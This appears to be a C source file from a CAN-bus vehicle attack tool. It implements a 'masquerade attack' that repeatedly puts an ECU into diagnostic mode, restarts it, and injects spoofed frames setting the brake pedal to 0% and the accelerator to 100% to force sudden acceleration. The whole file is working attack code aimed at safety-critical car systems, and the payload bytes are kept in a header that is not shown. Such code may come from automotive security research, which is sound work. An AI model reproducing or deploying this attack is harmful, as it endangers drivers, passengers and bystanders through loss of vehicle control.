#include "all_headers.h"
#include "payloads.h"

/*================================================================
msq.c
This function performs the masquerade attack

void msq_msq:
reset ECU and make sudde acceleration
(break pedal depth 0% && accel pedal depth 100%)
==================================================================*/
void msq_msq(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
    struct can_frame frame;

    do {
        // resetpayload1 [enter diag mode]
        send_can_packet(socket, addr, msq.payload1, sizeof(msq.payload1), canid);
        // resetpayload2 [restart the ecu]
        send_can_packet(socket, addr, msq.payload2, sizeof(msq.payload2), canid);

        // accelpayload1 [make break pedal depth 0%]
        send_can_packet(socket, addr, msq.payload3, sizeof(msq.payload3), 0x24);
        // accelpayload2 [make accel pedal depth 100%]
        send_can_packet(socket, addr, msq.payload4, sizeof(msq.payload4), 0x39);


        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);
}
